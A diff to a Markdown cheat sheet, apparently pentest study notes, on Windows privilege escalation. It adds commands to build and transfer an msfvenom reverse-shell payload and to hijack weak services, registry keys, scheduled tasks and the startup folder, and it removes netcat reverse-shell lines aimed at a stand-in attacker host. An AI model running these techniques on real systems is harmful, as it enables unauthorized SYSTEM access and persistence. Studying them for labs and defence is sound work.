@@ -83,6 +83,26 @@ Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction Sile
 
 ---
 
+## 📦 Transferring Files to the Target
+
+The easiest way to get a payload onto a Windows box from Kali:
+
+```bash
+# On Kali — spin up an SMB share in the current directory
+impacket-smbserver share .
+
+# On Windows target — copy from the share
+copy \\<kali_ip>\share\reverse.exe C:\PrivEsc\
+```
+
+Standard reverse shell payload used throughout Windows privesc:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
+```
+Catch with: `nc -lvnp <port>`
+
+---
+
 ## 🔧 Service Exploits
 
 ### Unquoted Service Paths
@@ -106,28 +126,35 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o My.exe
 ### Weak Service Permissions
 ```cmd
 :: Check service permissions with accesschk (Sysinternals)
+:: Note: always pass /accepteula on first run
+accesschk.exe /accepteula -uwcqv user <service>
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
-accesschk.exe /accepteula -uwcqv %username% *
 
-:: If SERVICE_CHANGE_CONFIG is available:
-sc config VulnService binpath= "C:\temp\shell.exe"
-sc stop VulnService
-sc start VulnService
-
-:: Or point to netcat:
-sc config VulnService binpath= "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
+:: Look for SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
+:: Note the space after binpath= — it will silently fail without it
+sc config <svc> binpath= "C:\PrivEsc\reverse.exe"
+net start <svc>
 ```
 
-### Weak File Permissions on Service Binary
+### Weak Registry Permissions on Service Key
 ```cmd
-:: Check if you can overwrite the service executable
-icacls "C:\path\to\service.exe"
-:: Look for (F) Full or (M) Modify for your user/group
+:: Check if the service registry key itself is writable
+accesschk /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<svc>
 
-:: Replace with malicious binary
-copy C:\temp\shell.exe "C:\path\to\service.exe"
-sc stop ServiceName
-sc start ServiceName
+:: If writable, change the ImagePath to your payload
+reg add HKLM\System\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\PrivEsc\reverse.exe" /f
+net start <svc>
+```
+
+### Insecure Service Executable
+```cmd
+:: Check if the service binary itself is writable
+accesschk /accepteula -quvw "C:\path\to\service.exe"
+
+:: Back up original, then overwrite
+copy C:\PrivEsc\reverse.exe "C:\path\to\service.exe"
+net stop <svc>
+net start <svc>
 ```
 
 ---
@@ -256,9 +283,35 @@ Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
 
 ### Exploit
 ```cmd
-:: If a scheduled task runs a writable script:
-echo C:\temp\nc.exe ATTACKER 4444 -e cmd.exe > "C:\path\to\script.bat"
-:: Wait for task to execute
+:: If a scheduled task runs a writable script, append a reverse shell call
+echo C:\PrivEsc\reverse.exe >> "C:\path\to\script.ps1"
+:: Wait for the schedule to trigger — this is a patience technique
+```
+
+---
+
+## 🖥️ GUI Application Privesc
+
+If an admin-run GUI application is accessible (e.g. MS Paint running as admin), use its file browser to execute a shell:
+
+```
+File > Open > type into filename box:
+file://c:/windows/system32/cmd.exe
+```
+
+This opens a cmd prompt with the application's privilege level.
+
+---
+
+## 📂 Startup Folder
+
+```cmd
+:: Check if the startup folder is writable
+icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+:: If writable, drop a payload — it runs next time an admin logs in
+copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+:: Another patience technique — requires waiting for an admin login
 ```
 
 ---
@@ -371,10 +424,22 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 ---
 
+## 💡 Key Takeaways
+
+- 90% of Windows privesc is permissions being wrong, not actual exploits
+- `accesschk` is the main tool to answer "can I touch this"
+- One reverse shell payload reused for every task — no need for a different one per technique
+- Always run `whoami` after catching a shell before assuming you're SYSTEM — some techniques land you as a different user, not SYSTEM
+- Run WinPEAS/PrivescCheck early, don't save it for last
+- Kernel exploits last — they can crash the machine
+
+---
+
 ## 🔗 Associated Tools
-- WinPEAS - Automated enumeration
-- PowerUp (PowerSploit) - Service exploit checks
-- Seatbelt - Security-focused enumeration
-- [Metasploit](../../TOOLS/metasploit.md) - Exploitation framework
-- [Hashcat](../../TOOLS/Hashcat.md) - Crack found hashes
-- LOLBAS (https://lolbas-project.github.io) - Living Off The Land
+- `Enumeration.md` — Windows privesc enumeration cheatsheet (this folder)
+- WinPEAS — Automated enumeration
+- PowerUp (PowerSploit) — Service exploit checks
+- Seatbelt — Security-focused enumeration
+- [Metasploit](../../TOOLS/metasploit.md) — Exploitation framework
+- [Hashcat](../../TOOLS/Hashcat.md) — Crack found hashes
+- LOLBAS (https://lolbas-project.github.io) — Living Off The Land
